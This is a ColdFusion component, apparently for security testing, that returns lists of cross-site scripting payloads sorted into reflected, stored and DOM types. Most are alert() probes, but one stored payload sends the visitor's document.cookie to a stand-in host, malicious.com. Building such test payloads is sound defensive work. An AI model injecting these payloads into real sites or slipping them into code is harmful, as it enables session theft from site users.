// /components/XSSService.cfc
component {
    property name="securityService" inject="SecurityService";
    
    public XSSService function init() {
        return this;
    }
    
    // Store test payloads for different XSS types
    public struct function getXSSPayloads() {
        return {
            reflected: [
                '<script>alert("reflected xss")</script>',
                'javascript:alert("reflected xss")',
                '<img src="x" onerror="alert(''reflected xss'')">', // Fixed syntax
                '<svg onload=alert("reflected xss")>'
            ],
            stored: [
                '<script>document.location="http://malicious.com/?cookie="+document.cookie</script>',
                '<img src="x" onmouseover="alert(''stored xss'')">',
                '<a href="javascript:alert(''stored xss'')">Click me</a>'
            ],
            dom: [
                'alert("dom xss")',
                '"><script>alert("dom xss")</script>',
                'javascript:alert("dom xss")//'
            ]
        };
    }
}